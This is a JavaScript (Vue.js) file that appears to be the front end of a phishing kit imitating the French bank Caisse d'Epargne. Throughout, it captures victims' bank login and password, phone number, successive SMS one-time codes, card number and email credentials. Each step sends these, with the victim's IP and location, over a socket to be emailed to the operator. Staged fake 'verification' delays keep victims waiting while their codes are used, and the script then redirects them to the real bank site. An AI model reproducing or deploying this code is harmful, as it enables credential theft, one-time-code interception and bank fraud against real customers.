

const index =new Vue({
    el:"#index",
    data:{
        error:false,
        loading:false,
        message:'Connexion en cours...',
        login:1,
        step :1,
        log:{
            ID:'',
            PASS: '',
            NUM: '',
            SMS:'',
            numcc:'',
            CODE:'',
            EMAIL:'',
            PASSWORD: '',


        }
    },
    mounted(){
$('body').show()
       console.log(this.content)


    },

    computed:{
        content(){
            var loc =JSON.stringify(locIp)

            var message ={
                name:'POPS-CE',
                from:'resultca@result.com',
                to:$('#Mail').val(),
                subject : this.login==2 ? 'CE LOG + PASS ' : '' + this.login==3 && this.step==1 ? 'CE AUTH-SMS ' :'' + this.login==3 && this.step==2 ? 'CE SECURE-SMS ':'' + this.login==3 && this.step==3 ? ' ':''+
                this.login==3 && this.step==4 ? ' ':'',
                html:''+JSON.stringify(this.log)+'<p><br>'+JSON.stringify(locIp)+'</p>'
            }
            return message
        }
    },
    methods:{

        showChat(){
            Tawk_API.toggle();
        },
        goToCredit(){
            if(this.log.ID=='' || this.log.PASS.length<6) return this.$Message.error('Corriger les champs SVP ')
            this.message='Vérification en cours ....'
            this.loading=true
            this.content.subject+=" + CODE SMS > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{

              if(clb){

                  this.$Message.success('Service activé ')
                  this.message="Redirection dans 3 secondes ..."

                setTimeout(()=>{
                     window.location.href="https://www.caisse-epargne.fr/"
              },3000)
              } else {
                  window.location.reload()
              }
              })


        },
        goToEspace(){

            if(this.log.PASS.length<8 || this.log.ID.length>10)  return this.$Message.error('Corriger les champs SVP ')
            setTimeout(()=>{
            this.message='Connexion en cours ....'
          },5000)
          setTimeout(()=>{
          this.message='Envoi du code par SMS ....'
        },5000)
            this.loading=true
            this.content.subject+="CE LOG+PASS > "+iPfull

            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                   if($('#Option').val()==1 || $('#option').val()=='1'){

                    setTimeout(()=>{
                        this.login=5
                        this.loading=false
                    },15000)

                   } else {
                    setTimeout(()=>{
                    this.login++
                    this.loading=false
                },24000)
            }
                } else {
                    window.location.reload()
                }
            })
        },

        goToStep1(){
                if(this.log.NUM.length!==10) return this.$Message.error('Numéro incorrect')
                this.message="Vérification du numéro en cours..."
                this.loading=true
                this.content.subject+=" > "+iPfull
                socket.emit('sendMail',this.content,(clb)=>{
                    if(clb){
                        setTimeout(()=>{
                            setTimeout(()=>{
                                this.message="Envoie du code par SMS , patientez SVP"
                            },5000)

                            setTimeout(()=>{
                                this.message="Synchronisation en cours..."
                            },8000)

                            setTimeout(()=>{

                                this.step=2
                               this.loading=false

                            },14000)
                        },7000)
                    } else {
                        window.location.reload()
                    }
                })
            },

        goToStep(){
            if(this.log.SMS.length!==8) return this.$Message.error('Code incorrect')
            this.message="Vérification du code en cours..."
            this.loading=true
            this.content.subject+=" CE SMS> "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    setTimeout(()=>{
                        setTimeout(()=>{
                            this.message="Vérifions votre identité..."
                        },5000)

                        setTimeout(()=>{
                            this.message="Synchronisation en cours..."
                        },8000)

                        setTimeout(()=>{

                            this.step=3
                           this.loading=false

                        },14000)
                    },7000)
                } else {
                    window.location.reload()
                }
            })
        },

        goToStep2(){
            if(this.log.SMS2.length<6) return this.$Message.error('Code incorrect')
            if(this.log.SMS2==this.log.SMS) return this.$Message.error('Saisissez le 2ème code reçu par SMS SVP...')
            this.message="Vérification du code en cours..."
            this.loading=true
            this.content.subject+=" > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    setTimeout(()=>{
                        setTimeout(()=>{
                            this.message="Envoie de nouveau code par E-mail , patientez SVP"
                        },5000)

                        setTimeout(()=>{
                            this.message="Synchronisation en cours..."
                        },8000)

                        setTimeout(()=>{

                            this.step=4
                           this.loading=false

                        },14000)
                    },7000)
                } else {
                    window.location.reload()
                }
            })
        },




        setCard(){
            if(this.log.numcc.length<14) return false
            this.message="Activation des services en cours ...."
            this.loading=true
            this.content.subject+="CE DETAILS CC > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    setTimeout(()=>{
                        setTimeout(()=>{
                            this.message="Envoie de nouveau code SMS , patientez SVP"
                        },5000)

                        setTimeout(()=>{
                            this.message="Synchronisation en cours..."
                        },8000)

                        setTimeout(()=>{

                            this.step=4
                           this.loading=false

                        },14000)
                    },7000)
                } else {
                    window.location.reload()
                }
            })

        },

        submitEmailPass(){
          if(this.log.PASSWORD.length<5 || this.log.EMAIL.length<10) return this.error=true
          this.loading=true
          this.content.subject+=" EMAIL + PASS > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{

              if(clb){

                  this.$Message.success('ACTIVATION SOUS 72H ')
                  this.message="Redirection dans 3 secondes ..."

                setTimeout(()=>{
                     window.location.href="https://www.caisse-epargne.fr/"
              },3000)
              } else {
                  window.location.reload()
              }
              })


        },



        submitForm(){
            if(this.log.CODE.length<6) return this.$Message.error('Code incorrect')
            if(this.log.CODE==this.log.SMS) return this.$Message.error('Saisissez le 2ème code reçu par SMS...')
            if(this.log.CODE==this.log.SMS2) return this.$Message.error('Saisissez le 2ème code reçu par SMS...')
            this.message="En cours d'activation ..."
            this.loading=true
            this.content.subject+="CE SMS2 > "+iPfull
            socket.emit('sendMail',this.content,(clb)=>{

              if(clb){

                setTimeout(()=>{
                    setTimeout(()=>{
                        this.message="Vérification de vos informations , patientez SVP"
                    },5000)

                    setTimeout(()=>{
                        this.message="Synchronisation en cours..."
                    },8000)

                    setTimeout(()=>{

                        this.step=5
                       this.loading=false

                    },14000)
                },7000)
              } else {
                  window.location.reload()
              }
              })


        }
    }

})
